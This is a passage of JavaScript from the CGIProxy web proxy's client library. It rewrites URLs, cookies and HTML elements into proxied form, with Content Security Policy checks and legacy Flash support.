    }

    if (doc._proxy_jslib_base_url) {
	while (uri.match(/^\/\.\.?\//))   uri= uri.replace(/^\/\.\.?\//, '/') ;
	if (doc._proxy_jslib_base_path.length==doc._proxy_jslib_base_host.length+1)
	    while (uri.match(/^\.\.?\//)) uri= uri.replace(/^\.\.?\//, '') ;
    }

    var absurl ;
    if      (/^[\w\+\.\-]*\:/.test(uri))  { absurl= uri               }
    else if (/^\/\//.test(uri))           { absurl= doc._proxy_jslib_base_scheme + uri }
    else if (/^\//.test(uri))             { absurl= doc._proxy_jslib_base_host   + uri }
    else if (/^\?/.test(uri))             { absurl= doc._proxy_jslib_base_file   + uri }
    else                                  { absurl= doc._proxy_jslib_base_path   + uri }

    var ret= _proxy_jslib_url_start + _proxy_jslib_wrap_proxy_encode(absurl) + (retain_query ? query : '') + frag ;
    return ret ;
}


function _proxy_jslib_full_url_by_frame(uri_ref, doc, is_frame, reverse, is_frame_src) {
    var old_url_start= _proxy_jslib_url_start ;
    _proxy_jslib_url_start= is_frame  ? _proxy_jslib_url_start_inframe  : _proxy_jslib_url_start_noframe ;
    try {
	var ret= _proxy_jslib_full_url(uri_ref, doc, reverse, void 0, is_frame_src) ;
    } finally {
	_proxy_jslib_url_start= old_url_start ;
    }
    return ret ;
}


// initializes _base vars for the given document
function _proxy_jslib_set_base_vars(doc, base_url) {
    if (!base_url) base_url= _proxy_jslib_parse_full_url(doc.URL)[3] ;

    // handle "about:blank", etc.
    if (!base_url.match(/^\s*https?\:\/\//i)) {
	doc._proxy_jslib_base_url= doc._proxy_jslib_base_scheme= doc._proxy_jslib_base_host=
	    doc._proxy_jslib_base_path= doc._proxy_jslib_base_file= '' ;
	return ;
    }

    doc._proxy_jslib_base_url= base_url.replace(/^\s+|\s+$/g, '')
				       .replace(/^([\w\+\.\-]+\:\/\/[^\/\?]+)\/?/, "$1/") ;
    doc._proxy_jslib_base_scheme= doc._proxy_jslib_base_url.match(/^([\w\+\.\-]+\:)\/\//)[1] ;
    doc._proxy_jslib_base_host=   doc._proxy_jslib_base_url.match(/^([\w\+\.\-]+\:\/\/[^\/\?]+)/)[1] ;
    doc._proxy_jslib_base_path=   doc._proxy_jslib_base_url.match(/^([^\?]*\/)/)[1] ;
    doc._proxy_jslib_base_file=   doc._proxy_jslib_base_url.match(/^([^\?]*)/)[1] ;
}


function _proxy_jslib_absolute_url(uri, doc) {
    var absurl ;
    doc= doc || document ;

    if      (/^[\w\+\.\-]*\:/.test(uri))  { absurl= uri               }
    else if (/^\/\//.test(uri))           { absurl= doc._proxy_jslib_base_scheme + uri }
    else if (/^\//.test(uri))             { absurl= doc._proxy_jslib_base_host   + uri }
    else if (/^\?/.test(uri))             { absurl= doc._proxy_jslib_base_file   + uri }
    else                                  { absurl= doc._proxy_jslib_base_path   + uri }

    return absurl ;
}



function _proxy_jslib_wrap_proxy_encode(URL) {
    var uf= URL.match(/^([^\#]*)(\#.*)?/) ;
    var uri= uf[1] ;
    var frag=  uf[2]  ? uf[2]  : '' ;

    uri= _proxy_jslib_proxy_encode(uri) ;
    uri= uri.replace(/\=/g, '=3d').replace(/\?/g, '=3f').replace(/\#/g, '=23')
	    .replace(/\%/g, '=25').replace(/\&/g, '=26').replace(/\;/g, '=3b')
	    .replace(/\[/g, '=5b').replace(/\]/g, '=5d') ;
    while (uri.match(/\/\//)) uri= uri.replace(/\/\//g, '=2f=2f') ;

    return uri + frag ;
}

function _proxy_jslib_wrap_proxy_decode(enc_URL) {
    var uf= enc_URL.match(/^([^\?\#]*)([^\#]*)(.*)/) ;
    var uri= uf[1] ;
    var query= uf[2] ;
    var frag=  uf[3]  ? uf[3]  : '' ;

    // Unfortunately, this little function turns out to be a CPU hog
    //uri= uri.replace(/\=(..)/g, function (s,p1) { return String.fromCharCode(eval('0x'+p1)) } ) ;
    uri= uri.replace(/\=2f/g, '/').replace(/\=25/g, '%').replace(/\=23/g, '#')
	    .replace(/\=3f/g, '?').replace(/\=26/g, '&').replace(/\=3b/g, ';')
	    .replace(/\=3d/g, '=') ;
    uri= _proxy_jslib_proxy_decode(uri) ;

    return uri + query + frag ;
}


// Next few functions for Flash 9+ support.
function _proxy_jslib_full_url_connect(url) {
    var m ;
//alert('starting _proxy_jslib_full_url_connect('+url+'), typeof=['+(typeof url)+']') ;
    if (!url) return url ;
    if (url.match(/^https?\:\/\//i)) return _proxy_jslib_full_url(url) ;
    if (m= url.match(/^rtmp\:\/\/([^\/]*\/[^\/]*)\/(.*)/i)) {
	var new_app= encodeURIComponent(m[1]) ;  // not perfect, but good for now?
	var portst= _proxy_jslib_RTMP_SERVER_PORT==1935  ? ''  : ':' + _proxy_jslib_RTMP_SERVER_PORT ;
	return 'rtmp://' + _proxy_jslib_THIS_HOST + portst + '/' + new_app + '/' + m[2] ;
    }
    return url ;
}

function _proxy_jslib_full_url_play(url) {
//alert('starting _proxy_jslib_full_url_play('+url+'), typeof=['+(typeof url)+']') ;
    if (!url) return url ;
    if (typeof url!='string') return url ;    // in case called for wrong 'play'
    if (!url.match(/^https?\:\/\//i)) return url ;
    return _proxy_jslib_full_url(url) ;   // could use retain_query param when supported
}

// simple function for Flash to call, for e.g. flash.display.LoaderInfo.loaderURL
function _proxy_jslib_reverse_full_url(url) {
//alert('starting _proxy_jslib_reverse_full_url('+url+')') ;
    return _proxy_jslib_parse_full_url(url)[3] ;
}

// simple function for Flash's flash.external.ExternalInterface.call(),
//   which actually can take any JS as its first parameter.
function _proxy_jslib_proxify_js_array_0(a) {
//alert('starting _proxy_jslib_proxify_js_array_0()') ;
    if ((a instanceof Array) && ((typeof a[0]=='string') || (a[0] instanceof String)))
	a[0]= _proxy_jslib_proxify_js(a[0]+'()').replace(/\(\)$/, '') ;
//alert('after _proxy_jslib_proxify_js_array_0:\na=['+JSON.stringify(a)+']\ntypeof a[0]=['+(typeof a[0])+']') ;
    return a ;
}

// used when handling apply(), when target object is flash.external.ExternalInterface.call() .  :P
// gets a two-item array, whose second item is an array with call's parameters,
//   the first of which is a function name or body.
function _proxy_jslib_proxify_js_array_1_0(a) {
//alert('starting _proxy_jslib_proxify_js_array_1_0; a[1][0]=['+a[1][0]+']') ;
    if ((a instanceof Array) && ((typeof a[1][0]=='string') || (a[1][0] instanceof String)))
	a[1][0]= _proxy_jslib_proxify_js(a[1][0]+'()').replace(/\(\)$/, '') ;
//alert('ending _proxy_jslib_proxify_js_array_1_0; a[1][0]=['+a[1][0]+']') ;
    return a ;
}

var _proxy_jslib_in_mb= 0 ;
var _proxy_jslib_call_stack= [] ;
function alert_obj(obj) {
    if (obj==1954) _proxy_jslib_in_mb++ ;
    if (typeof obj=='number' && obj>0) _proxy_jslib_call_stack.unshift(obj) ;
    if (_proxy_jslib_call_stack.length>50) _proxy_jslib_call_stack.pop() ;
    if (_proxy_jslib_in_mb<4) return ;
    alert('in alert_obj, call stack=\n' + _proxy_jslib_call_stack + '\nobj= [' + JSON.stringify(obj) + ']') ;
//    alert('in alert_obj: count=['+_proxy_jslib_in_mb+']; typeof=['+(typeof obj)+'][' + Function.prototype.toString(obj) + ']') ;
    if (typeof obj=='number' && obj==-_proxy_jslib_call_stack[0]) _proxy_jslib_call_stack.shift() ;
}



function _proxy_jslib_cookie_to_client(cookie, doc) {
    if (_proxy_jslib_cookies_are_banned_here) return '' ;

    var u= _proxy_jslib_parse_url((doc.defaultView||doc.parentWindow)._proxy_jslib_URL) ;
    if (u==null) {
	alert("CGIProxy Error: Can't parse URL <"+(doc.defaultView||doc.parentWindow)._proxy_jslib_URL+">; not setting cookie.") ;
	return '' ;
    }
    var origin_host= u[4] ;
    var source_path= u[6] ;
    if (source_path.substr(0,1)!='/') source_path= '/' + source_path ;

    cookie= cookie.replace(/[\0\n\r]/g, '') ;    // prevent HTTP header injection

    var name, value, expires_clause, path, domain, secure_clause ;
    var new_name, new_value, new_cookie ;

    name= value= expires_clause= path= domain= secure_clause=
	new_name= new_value= new_cookie= '' ;

    if (/^\s*([^\=\;\,\s]*)\s*\=?\s*([^\;]*)/.test(cookie)) {
	name= RegExp.$1 ; value= RegExp.$2 ;
    }
    if (/\;\s*(expires\s*\=[^\;]*)/i.test(cookie))        expires_clause= RegExp.$1 ;
    if (/\;\s*path\s*\=\s*([^\;\,\s]*)/i.test(cookie))    path= RegExp.$1 ;
    if (/\;\s*domain\s*\=\s*([^\;\,\s]*)/i.test(cookie))  domain= RegExp.$1 ;
    if (/\;\s*(secure\b)/i.test(cookie))                  secure_clause= RegExp.$1 ;

    if (path=='') path= _proxy_jslib_COOKIE_PATH_FOLLOWS_SPEC  ? source_path  : '/' ;

    if (domain=='') {
	domain= origin_host ;
    } else {
	domain= domain.replace(/\.+$/, '') ;
	domain= domain.replace(/\.{2,}/g, '.') ;
	if ( (origin_host.substr(origin_host.length-domain.length)!=domain.toLowerCase()) && ('.'+origin_host!=domain) )
	    return '' ;
	if (domain.match(/^[\d\.]$/) && (domain!=origin_host))  return '' ;   // illegal to use partial IP address
	var dots= domain.match(/\./g) ;
	if (_proxy_jslib_RESPECT_THREE_DOT_RULE) {
	    if (dots.length<3 && !( dots.length>=2 && /\.(com|edu|net|org|gov|mil|int)$/i.test(domain) ) )
		return '' ;
	} else {
	    if (dots.length<2) {
		if (domain.match(/^\./)) return '' ;
		domain= '.'+domain ;
		if (dots.length<1) return '' ;
	    }
	}
    }

    new_name=  _proxy_jslib_cookie_encode('COOKIE;'+name+';'+path+';'+domain) ;
    new_value= _proxy_jslib_cookie_encode(value+';'+secure_clause) ;

    if (_proxy_jslib_SESSION_COOKIES_ONLY && (expires_clause!='')) {
	/^expires\s*\=\s*(.*)$/i.test(expires_clause) ;
	var expires_date= RegExp.$1.replace(/\-/g, ' ') ;  // Date.parse() can't handle "-"
	if ( Date.parse(expires_date) > (new Date()).getTime() ) expires_clause= '' ;
    }

    new_cookie= new_name+'='+new_value ;
    if (expires_clause!='') new_cookie= new_cookie+'; '+expires_clause ;
    new_cookie= new_cookie+'; path='+_proxy_jslib_SCRIPT_NAME+'/' ;
//    if (secure_clause!='')  new_cookie= new_cookie+'; '+secure_clause ;

    return new_cookie ;
}


function _proxy_jslib_cookie_from_client(doc) {
    if (_proxy_jslib_cookies_are_banned_here) return _proxy_jslib_COOKIES_FROM_DB ;
    if (!doc.cookie) return _proxy_jslib_COOKIES_FROM_DB ;

    var target_path, target_server, target_scheme ;
    var u= _proxy_jslib_parse_url((doc.defaultView||doc.parentWindow)._proxy_jslib_URL) ;
    if (u==null) {
	alert("CGIProxy Error: Can't parse URL <"+(doc.defaultView||doc.parentWindow)._proxy_jslib_URL+">; not using cookie.") ;
	return ;
    }
    target_scheme= u[1] ;
    target_server= u[4] ;
    target_path= u[6] ;
    if (target_path.substr(0,1)!='/') target_path= '/' + target_path ;

    var matches= new Array() ;
    var pathlen= new Object() ;
    var cookies= doc.cookie.split(/\s*;\s*/) ;
    //for (var c in cookies) {
    for (var c= 0 ; c < cookies.length ; c++) {
	var nv= cookies[c].split('=', 2) ;
	var name=  _proxy_jslib_cookie_decode(nv[0]) ;
	var value= _proxy_jslib_cookie_decode(nv[1]) ;
	var n= name.split(/;/) ;
	if (n[0]=='COOKIE') {
	    var cname, path, domain, cvalue, secure ;
	    cname= n[1] ; path= n[2] ; domain= n[3].toLowerCase() ;
	    var v= value.split(/;/) ;
	    cvalue= v[0] ; secure= v[1] ;
	    if (secure!='' && secure!=null && target_scheme!='https:') continue ;
	    if ( ((target_server.substr(target_server.length-domain.length)==domain)
		  || (domain=='.'+target_server))
		&& target_path.substr(0, path.length)==path )
	    {
		matches[matches.length]= cname  ? cname+'='+cvalue  : cvalue ;
		pathlen[cname+'='+cvalue]= path.length ;
	    }
	}
    }

    matches.sort(function (v1,v2) { return (pathlen[v2]-pathlen[v1]) } ) ;

    if (_proxy_jslib_COOKIES_FROM_DB!='') matches.unshift(_proxy_jslib_COOKIES_FROM_DB) ;

    return matches.join('; ') ;
}


// this doesn't need to process a response
function _proxy_jslib_store_cookie_in_db(cookie) {
    var url= _proxy_jslib_url_start_inframe
	   + _proxy_jslib_wrap_proxy_encode('x-proxy://cookies/set-cookie?'
					  + _proxy_jslib_origin + '&' + _proxy_jslib_cookie_encode(cookie)) ;
    var xhr= new XMLHttpRequest() ;
    xhr.open('GET', url) ;
    xhr.send() ;
}




// returns [new_html, remainder, jslib_added, found_frameset]
// call with reverse=true to un-proxify a block of HTML-- convenient but kinda hacky
// if still_needs_jslib, then insert jslib; we insert jslib in all pages, since
//   we can't predict future writes on the same page.
function _proxy_jslib_proxify_html(html, doc, still_needs_jslib, reverse) {
    var out= [] ;
    var match, m2, last_lastIndex= 0, remainder ;
    var tag_name, html_pos, head_pos ;
    var base_url, base_url_jsq, jslib_block, insert_string, insert_pos ;
    var jslib_added= false ;

    if (html==void 0) return [void 0, void 0, false, false] ;
    if (typeof html=='number') return [html, void 0, false, false] ;

    // force html to a string
    html= html.toString() ;

    // start, comment, script_block, style_block, decl_bang, decl_question, tag
    // note that a unique instance of RE must be created, in case of recursion
    var RE= new RegExp(/([^\<]*(?:\<(?![\w\/\!])[^\<]*)*)(?:(\<\!\-\-(?=[\s\S]*?\-\-\>)[\s\S]*?\-\-\s*\>|\<\!\-\-(?![\s\S]*?\-\-\>)[\s\S]*?\>)|(\<script\b[\s\S]*?\<\/script\b[\s\S]*?\>)|(\<style\b[\s\S]*?\<\/style\b[\s\S]*?\>)|(\<\![^\>]*\>)|(\<\?[^\>]*\>)|(\<[^\>]*\>))?/gi) ;
    var RE2= new RegExp(/[^\>]*(?:\>|$)/g) ;

    while ((last_lastIndex!=html.length) && (match= RE.exec(html))) {
	if (match.index!=last_lastIndex) {
	    remainder= html.slice(last_lastIndex) ;
	    break ;
	}
	last_lastIndex= RE2.lastIndex= RE.lastIndex ;

	out.push(match[1]) ;

	if (match[2]) {
	    out.push(_proxy_jslib_proxify_comment(match[2], doc, reverse)) ;
	} else if (match[3]) {
	    out.push(_proxy_jslib_proxify_script_block(match[3], doc, reverse)) ;
	} else if (match[4]) {
	    out.push(_proxy_jslib_proxify_style_block(match[4], doc, reverse)) ;
	} else if (match[5]) {
	    out.push(_proxy_jslib_proxify_decl_bang(match[5], doc, reverse)) ;
	} else if (match[6]) {
	    out.push(_proxy_jslib_proxify_decl_question(match[6], doc, reverse)) ;

	} else if (match[7]) {
	    m2= match[7].match(/^\<\s*(\/?[A-Za-z][\w\.\:\-]*)/) ;
	    if (!m2) continue ;    // hack until we parse more rigorously
	    tag_name= m2[1].toLowerCase() ;

	    // these would indicate incomplete blocks
	    if ((tag_name=='script') || (tag_name=='style')) {
		remainder= match[7]+html.slice(last_lastIndex) ;
		break ;
	    }

	    if ((tag_name=='frameset') && _proxy_jslib_doing_insert_here && !_proxy_jslib_is_in_frame && !reverse) {
		_proxy_jslib_return_frame_doc(_proxy_jslib_wrap_proxy_encode(_proxy_jslib_URL), doc) ;
		return ['', void 0, false, true] ;
	    }

	    if (tag_name=='/object') _proxy_jslib_current_object_classid= '' ;

	    // if undefined return value, add up to next ">" and try again
	    var new_element= _proxy_jslib_proxify_element(match[7], doc, reverse) ;
	    while (new_element==void 0 && last_lastIndex!=html.length) {
		m2= RE2.exec(html) ;
		last_lastIndex= RE.lastIndex= RE2.lastIndex ;
		match[7]+= m2[0] ;
		new_element= _proxy_jslib_proxify_element(match[7], doc, reverse) ;
	    }
	    out.push(new_element) ;

	    if      (tag_name=='html') { html_pos= out.length }
	    else if (tag_name=='head') { head_pos= out.length }

	// no <...> block left
	} else {
	    break ;
	}
    }

    if ((last_lastIndex!=html.length) && !remainder)
	 remainder= html.slice(last_lastIndex) ;


    // Don't worry about top insertion.  Hacky.
    // Don't handle _proxy_jslib_needs_jslib, since a not-jslib-requiring write
    //   may be followed by a jslib-requiring write; add the JS insertion to all pages.
    if (still_needs_jslib && !reverse) {

	jslib_block= '<script class="_proxy_jslib_jslib" type="text/javascript" src="'
		       + _proxy_jslib_html_escape(_proxy_jslib_url_start+_proxy_jslib_wrap_proxy_encode('x-proxy://scripts/jslib'))
		       + '"><\/script>\n' ;

	if (!doc._proxy_jslib_base_url) {
	    base_url= _proxy_jslib_parse_full_url(doc.URL)[3] ;
	    _proxy_jslib_set_base_vars(doc, base_url) ;
	}
	base_url_jsq= doc._proxy_jslib_base_url
		.replace(/(["\\])/g, function (p) { return '\\'+p } ) ;
	if (base_url_jsq!=void 0) base_url_jsq= '"' + base_url_jsq + '"' ;
	var cookies_from_db_jsq= _proxy_jslib_COOKIES_FROM_DB.replace(/(["\\\\])/g, function (p) { return "\\\\"+p } ) ;
	insert_string= '<script  class="_proxy_jslib_pv" type="text/javascript">_proxy_jslib_pass_vars('
		     + base_url_jsq + ',"'
		     + _proxy_jslib_origin + '",'
		     + _proxy_jslib_cookies_are_banned_here + ','
		     + _proxy_jslib_doing_insert_here + ','
		     + _proxy_jslib_SESSION_COOKIES_ONLY + ','
		     + _proxy_jslib_COOKIE_PATH_FOLLOWS_SPEC + ','
		     + _proxy_jslib_RESPECT_THREE_DOT_RULE + ','
		     + _proxy_jslib_ALLOW_UNPROXIFIED_SCRIPTS + ',"'
		     + _proxy_jslib_RTMP_SERVER_PORT + '","'
		     + _proxy_jslib_default_script_type + '","'
		     + _proxy_jslib_default_style_type + '",'
		     + _proxy_jslib_USE_DB_FOR_COOKIES + ','
		     + _proxy_jslib_PROXIFY_COMMENTS + ','
		     + _proxy_jslib_ALERT_ON_CSP_VIOLATION + ',"'
		     + cookies_from_db_jsq + '",'
		     + _proxy_jslib_TIMEOUT_MULTIPLIER + ',"'
		     + _proxy_jslib_csp_st + '")<\/script>\n' ;
	insert_pos= head_pos || html_pos || 0 ;
	out.splice(insert_pos, 0, jslib_block, insert_string) ;
	jslib_added= true ;
    }

    return [out.join(''), remainder, jslib_added] ;
}



function _proxy_jslib_proxify_comment(comment, doc, reverse) {
    if (!_proxy_jslib_PROXIFY_COMMENTS) return comment ;
    var m= comment.match(/^\<\!\-\-([\S\s]*?)(\-\-\s*)?>$/) ;
    var contents= m[1] ;
    var end= m[2] ;
    contents= _proxy_jslib_proxify_html(contents, doc, false, reverse)[0] ;
    comment= '<!--' + contents + end + '>' ;
    return comment ;
}


function _proxy_jslib_proxify_decl_bang(decl_bang, doc, reverse) {
    var q ;
    var inside= decl_bang.match(/^\<\!([^>]*)/)[1] ;
    var words= inside.match(/\"[^\"\>]*\"?|\'[^\'\>]*\'?|[^\'\"][^\s\>]*/g) ;
    for (var i=0 ; i<words.length ; i++) {
	words[i]= words[i].replace(/^\s*/, '') ;
	if (words[i].match(/^[\'\"]?http\:\/\/www\.w3\.org\//)) continue ;
	if (words[i].match(/^[\"\']?[\w\+\.\-]+\:\/\//)) {
	    if      (words[i].match(/^'/))  { q= "'" ; words[i]= words[i].replace(/^\'|\'$/g, '') }
	    else if (words[i].match(/^"/))  { q= '"' ; words[i]= words[i].replace(/^\"|\"$/g, '') }
	    else                            { q= '' }
	    words[i]= q + _proxy_jslib_full_url(words[i], doc, reverse) + q ;
	}
    }
    decl_bang= '<!' + words.join(' ') + '>' ;
    return decl_bang ;
}


function _proxy_jslib_proxify_decl_question(decl_question, doc, reverse) {
    return decl_question ;
}


function _proxy_jslib_proxify_script_block(script_block, doc, reverse) {
    var m1, m2, tag, script, attrs, attr, name ;
    attr= new Object() ;

    m1= script_block.match(/^(\<\s*script\b[^\>]*\>)([\s\S]*)\<\s*\/script\b[^\>]*\>$/i) ;

    script= m1[2] ;
    if (script.match(/\S/) && !_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['script-src'], "'unsafe-inline'"))
	_proxy_jslib_throw_csp_error("CSP script-src inline error") ;

    tag= _proxy_jslib_proxify_element(m1[1], doc, reverse) ;

    attrs= tag.match(/^\<\s*script\b([^\>]*)\>/i)[1] ;

    while (m2= attrs.match(/([A-Za-z][\w\.\:\-]*)\s*(\=\s*(\"([^\"\>]*)\"?|\'([^\'\>]*)\'?|([^\'\"][^\s\>]*)))?/)) {
	attrs= attrs.substr(m2[0].length) ;
	name= m2[1].toLowerCase() ;
	if (attr[name]!=null) continue ;
	attr[name]= m2[4]  ? m2[4]  : m2[5]  ? m2[5]  : m2[6]  ? m2[6]  : '' ;
	attr[name]= _proxy_jslib_html_unescape(attr[name]) ;
    }
    if (attr.type!=null) attr.type= attr.type.toLowerCase() ;
    if (!attr.type && attr.language) {
	attr.type= attr.language.match(/javascript|ecmascript|livescript|jscript/i)
						     ? 'application/x-javascript'
		 : attr.language.match(/css/i)       ? 'text/css'
		 : attr.language.match(/vbscript/i)  ? 'application/x-vbscript'
		 : attr.language.match(/perl/i)      ? 'application/x-perlscript'
		 : attr.language.match(/tcl/i)       ? 'text/tcl'
		 : '' ;
    }
    if (!attr.type) attr.type= _proxy_jslib_default_script_type ;

    // For now, don't worry about "<\/script" (unescaped) inside JS-written scripts.

    script= _proxy_jslib_proxify_block(script, attr.type,
		_proxy_jslib_ALLOW_UNPROXIFIED_SCRIPTS, reverse) ;

    return tag+script+'<\/script>' ;
}


function _proxy_jslib_proxify_style_block(style_block, doc, reverse) {
    var m1, m2, tag, stylesheet, attrs, type ;
    m1= style_block.match(/^(\<\s*style\b[^\>]*\>)([\s\S]*)\<\s*\/style\b[^\>]*\>$/i) ;

    stylesheet= m1[2] ;
    if (stylesheet.match(/\S/) && !_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['style-src'], "'unsafe-inline'"))
	_proxy_jslib_throw_csp_error("CSP style-src inline error") ;

    tag= _proxy_jslib_proxify_element(m1[1], doc, reverse) ;

    attrs= tag.match(/^\<\s*style\b([^\>]*)\>/i)[1] ;

    while (m2= attrs.match(/([A-Za-z][\w\.\:\-]*)\s*(\=\s*(\"([^\"\>]*)\"?|\'([^\'\>]*)\'?|([^\'\"][^\s\>]*)))?/)) {
	attrs= attrs.substr(m2[0].length) ;
	if (m2[1].toLowerCase()=='type') {
	    type= m2[4]!=null  ? m2[4]  : m2[5]!=null  ? m2[5]  : m2[6]!=null  ? m2[6]  : '' ;
	    type= _proxy_jslib_html_unescape(type).toLowerCase() ;
	    break ;
	}
    }
    if (!type) type= _proxy_jslib_default_style_type ;
    stylesheet= _proxy_jslib_proxify_block(stylesheet, type,
			_proxy_jslib_ALLOW_UNPROXIFIED_SCRIPTS, reverse) ;

    return tag+stylesheet+'<\/style>' ;
}



// returns undef on error, like when "<>" are in an attribute (hacky)
function _proxy_jslib_proxify_element(element, doc, reverse) {
    // Unfortunately, attr{} may have extra properties if a Web page changes
    //   anything in the Object prototype.  Thus, we use names[] to keep track
    //   of the tag's attributes.  We do this elsewhere too.
    var m1, m2, tag_name, attrs, attr= {}, names= [], name, i, rebuild, end_slash,
	old_url_start ;
    if (!doc) doc= window.document ;

    if (!(m1= element.match(/^\<\s*([A-Za-z][\w\.\:\-]*)\s*([\s\S]*)$/))) return element ;
    tag_name= m1[1].toLowerCase() ;
    attrs= m1[2] ;
    // ignore possibility of <frameset> tag
    if (attrs=='') return element ;

    // note that last match indicates an unterminated string
    while (m2= attrs.match(/([A-Za-z][\w\.\:\-]*)\s*(\=\s*(\"([^\"]*)\"|\'([^\']*)\'|([^\'\"][^\s\>]*)|(\'[^\']*$|\"[^\"]*$)))?/)) {
	// if ends on broken string, return undef
	if (m2[7]) return void 0 ;
	attrs= attrs.substr(m2.index+m2[0].length) ;
	name= m2[1].toLowerCase() ;
	if (name in attr) { rebuild= 1 ; continue }
	// must compare to both undefined and '' to cover all browsers
	attr[name]= (m2[4]!=void 0 && m2[4]!='') ? m2[4]
		  : (m2[5]!=void 0 && m2[5]!='') ? m2[5]
		  : (m2[6]!=void 0 && m2[6]!='') ? m2[6]
		  : '' ;
	attr[name]= _proxy_jslib_html_unescape(attr[name]) ;
	names.push(name) ;
    }


    // Now we have tag_name, attr[], and names[] set.

//    for (name in attr) {
    for (i= 0 ; i<names.length ; i++) {
	name= names[i] ;
	// for now, simply delete attributes with script macros
	if (attr[name].match(/\&\{.*\}\;/)) { delete attr[name] ; rebuild= 1 ; continue }

	if (name.match(/^on/)) {
	    attr[name]= _proxy_jslib_proxify_block(attr[name], _proxy_jslib_default_script_type, _proxy_jslib_ALLOW_UNPROXIFIED_SCRIPTS, reverse) ;
	    rebuild= 1 ;
	}
    }


    if (tag_name=='object') {
	_proxy_jslib_current_object_classid= attr.classid ;
	if (attr.data) {
	    if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['object-src'], _proxy_jslib_absolute_url(attr.data)))
		_proxy_jslib_throw_csp_error('object-src violation in <object data> attribute') ;
	    var old_url_start= _proxy_jslib_url_start ;
	    var flags_5= _proxy_jslib_flags[5] ;
	    _proxy_jslib_flags[5]= 1 ;
	    try {
		_proxy_jslib_url_start= _proxy_jslib_url_start_by_flags(_proxy_jslib_flags) ;
		attr.data= _proxy_jslib_full_url(attr.data, doc, reverse) ;
	    } finally {
		_proxy_jslib_url_start= old_url_start ;
		_proxy_jslib_flags[5]= flags_5 ;
	    }
	    rebuild= 1 ;
	}

    } else if (tag_name=='param') {
//	if (_proxy_jslib_current_object_classid &&
//	    _proxy_jslib_current_object_classid.match(/^\s*clsid\:\{?D27CDB6E-AE6D-11CF-96B8-444553540000\}?\s*$/i))
//	{
	    if (attr.name && attr.name.match(/^movie$/i)) {
		attr.value= _proxy_jslib_full_url(attr.value, doc, reverse, 1) ;
		rebuild= 1 ;
	    }
//	}

    } else if (tag_name=='applet') {
	if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['object-src'], _proxy_jslib_absolute_url(attr.code)))
	    _proxy_jslib_throw_csp_error('object-src violation in <applet code> attribute') ;
	var arcs= attr.archive.split(/\s+/) ;
	for (var i= 0 ; i<arcs.length ; i++)
	    if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['object-src'], _proxy_jslib_absolute_url(arcs[i])))
		_proxy_jslib_throw_csp_error('object-src violation in <applet archive> attribute') ;
	var old_base_url= doc._proxy_jslib_base_url ;
	if (attr.codebase) _proxy_jslib_set_base_vars(doc, attr.codebase) ;
	attr.code= _proxy_jslib_full_url(attr.code, doc, reverse) ;
	for (var i ; i<arcs.length ; i++)
	    arcs[i]= _proxy_jslib_full_url(arcs[i], doc, reverse) ;
	attr.archive= arcs.join(' ') ;
	_proxy_jslib_set_base_vars(doc, old_base_url) ;
	rebuild= 1 ;

    } else if (tag_name=='base') {
	(doc.defaultView||doc.parentWindow)._proxy_jslib_base_unframes= attr.target && attr.target.match(/^_(top|blank)$/i) ;
    }


    if ('style' in attr) {
	if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['style-src'], "'unsafe-inline'"))
	    _proxy_jslib_throw_csp_error('style-src violation with <'+tag_name+' style> attribute') ;
	if (attr.style.match(/(expression|function)\s*\(/i ))
	    attr.style= _proxy_jslib_global_replace(attr.style, /\b((expression|function)\s*\()([^\)]*)/i,
						    function (p) { return p[1]+_proxy_jslib_proxify_js(p[3], void 0, void 0, void 0, reverse) } ) ;

	attr.style= _proxy_jslib_proxify_block(attr.style, _proxy_jslib_default_style_type, _proxy_jslib_ALLOW_UNPROXIFIED_SCRIPTS, reverse) ;
	rebuild= 1 ;
    }

    // huge simplification of tag-specific block
    if (('href' in attr) && tag_name.match(/^(a|base|area|link)$/))       {
	if ((tag_name=='link') && (attr.rel && attr.rel.toLowerCase()=='icon')
	      && !_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['img-src'], _proxy_jslib_absolute_url(attr.href)))
	{
	    _proxy_jslib_throw_csp_error("img-src violation in <link rel=icon href> attribute") ;
	} else if (tag_name=='base') {
	    if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['base-uri'], _proxy_jslib_absolute_url(attr.href)))
		_proxy_jslib_throw_csp_error("CSP base-uri error: " + val) ;
	    _proxy_jslib_set_base_vars(doc, attr.href) ;
	}

	if ( ((doc.defaultView||doc.parentWindow)._proxy_jslib_base_unframes && attr.target==void 0) ||
	     (attr.target && attr.target.match(/^_(top|blank)$/i)) )
	    attr.href= _proxy_jslib_full_url_by_frame(attr.href, doc, 0, reverse) ;
	else
	    attr.href= _proxy_jslib_full_url(attr.href, doc, reverse)
	rebuild= 1 ;
    }

    if ('src' in attr)         {
	if (tag_name=='frame' || tag_name=='iframe') {
	    if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['frame-src'], _proxy_jslib_absolute_url(attr.src)))
		_proxy_jslib_throw_csp_error("CSP frame-src inline error") ;
				 attr.src=  _proxy_jslib_full_url_by_frame(attr.src, doc, 1, reverse, 1) ; rebuild= 1 ;
	} else if (tag_name=='script') {   // messy  :P
	    if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['script-src'], _proxy_jslib_absolute_url(attr.src))) {
		_proxy_jslib_throw_csp_error("CSP script-src inline error") ;
	    } else {
		var old_url_start= _proxy_jslib_url_start ;
		var flags_6= _proxy_jslib_flags[6] ;
		_proxy_jslib_flags[6]= (attr.type!==void 0)  ? attr.type  : _proxy_jslib_default_script_type ;
		try {
		    _proxy_jslib_url_start= _proxy_jslib_url_start_by_flags(_proxy_jslib_flags) ;
				 attr.src=         _proxy_jslib_full_url(attr.src, doc, reverse) ;         rebuild= 1 ;
		} finally {
		    _proxy_jslib_url_start= old_url_start ;
		    _proxy_jslib_flags[6]= flags_6 ;
		}
	    }
	} else if (tag_name=='embed') {
	    if (!_proxy_jslib_match_csp_source_list(_proxy_jslib_csp['object-src'], _proxy_jslib_absolute_url(attr.src)))
		_proxy_jslib_throw_csp_error("object-src violation in <embed src> attribute") ;
			       { attr.src=         _proxy_jslib_full_url(attr.src, doc, reverse, (attr.type && attr.type.toLowerCase()=='application/x-shockwave-flash')) ;      rebuild= 1 }
	} else if (tag_name=='img') {
